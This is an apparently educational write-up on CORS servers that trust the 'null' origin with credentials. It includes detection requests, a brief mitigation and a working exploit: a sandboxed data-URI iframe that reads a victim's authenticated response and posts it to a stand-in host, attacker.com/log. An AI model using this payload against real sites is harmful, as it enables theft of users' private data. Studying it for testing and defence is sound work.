# Trusted Null Origin - Leveraging Misconfigured CORS to Bypass SOP Restrictions
## The Vulnerability

CORS (Cross-Origin Resource Sharing) policies use the `Access-Control-Allow-Origin` header to specify which origins can access a resource. This header accepts three types of values:

1. A specific origin (e.g., `https://trusted-domain.com`)
2. The wildcard `*` 
3. The value `null`

When a server is configured to trust the `null` origin alongside credentials, it creates a vulnerability:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

This configuration allows any request with `Origin: null` to bypass same-origin policy restrictions and access sensitive data with the victim's credentials.

## Why This Matters

Browsers assign the `null` origin in specific contexts, most notably:

- Sandboxed iframes (without `allow-same-origin` flag set)
- Redirects from `data:` URLs
- Requests from local HTML files (`file://`)
- Documents created with `document.implementation.createDocument()`

An attacker can force any of these contexts, meaning they can reliably trigger a `null` origin from any domain they control.

## Detection

To identify this misconfiguration, send a request to a credential-protected endpoint with `Origin: null`:

```http
GET /api/user/data HTTP/1.1
Host: vulnerable-target.com
Origin: null
Cookie: session=valid_session_token
```

If the response includes both of these headers, the endpoint is vulnerable:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

## Exploitation

The most reliable exploitation method uses a sandboxed iframe with a `data:` URI:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        src="data:text/html,
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://vulnerable-target.com', true);
    xhr.withCredentials = true;
    
    xhr.onload = function() {
        // Exfiltrate the response
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://attacker.com/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({
            data: btoa(xhr.responseText)
        }));
    };
    
    xhr.send();
</script>">
</iframe>
```

For example, when a victim visits a page containing this iframe:

1. The sandboxed iframe executes JavaScript with `Origin: null`
2. The XMLHttpRequest includes the victim's cookies (`withCredentials: true`)
3. The vulnerable server accepts the request because it trusts `null`
4. The response is sent back to the iframe
5. The data is exfiltrated to the attacker's server

This works because:
- The `sandbox` attribute on the iframe causes the browser to use `null` as the origin
- The `data:` URI contains the malicious JavaScript
- The victim's cookies are automatically included due to `withCredentials: true`
- The server's CORS policy explicitly allows `null`, bypassing same-origin policy

## Mitigation

Remove `null` from allowed origins and implement strict origin validation.

## Technical References

- [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - CORS](https://portswigger.net/web-security/cors)
- [MDN Web Docs - CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [W3C CORS Specification](https://www.w3.org/TR/cors/)
